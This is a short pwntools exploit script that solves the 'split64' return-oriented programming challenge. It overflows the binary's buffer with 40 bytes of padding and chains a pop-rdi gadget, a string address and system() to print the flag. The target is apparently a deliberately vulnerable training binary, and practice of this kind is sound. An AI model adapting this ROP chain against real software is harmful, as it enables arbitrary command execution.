#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

from pwn import *

context(arch="amd64", os="linux", endian="little")
e = ELF("./split64")

POP_RDI = 0x400883
STRING = e.symbols['usefulString']
SYSTEME = 0x400810
PADDING = "A"*40
PAYLOAD = PADDING + p64(POP_RDI) + p64(STRING) + p64(SYSTEME)

p = process(['./split64'])
msg = p.recv(timeout=0.1)
print msg

p.sendline(PAYLOAD)
msg = p.recvuntil('}')
print msg

p.close()
